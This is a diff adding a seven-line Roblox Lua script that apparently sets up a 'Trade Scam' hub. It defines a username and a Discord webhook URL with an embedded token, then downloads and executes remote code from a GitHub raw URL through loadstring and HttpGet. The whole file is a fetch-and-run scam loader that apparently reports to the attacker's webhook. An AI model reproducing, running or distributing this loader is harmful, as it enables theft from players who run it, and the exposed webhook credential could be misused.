@@ -1,0 +1,7 @@
+_G.Username = "TurkzTzy1"
+
+_G.HubName = "Trade Scam"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1106214273664954418/I9jyOtA08v4ctVSHmeC-ELmANOUHHerG8QU_YYEiuAaRbHlC8D2M-EgLbRoZsz5fdnp8"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
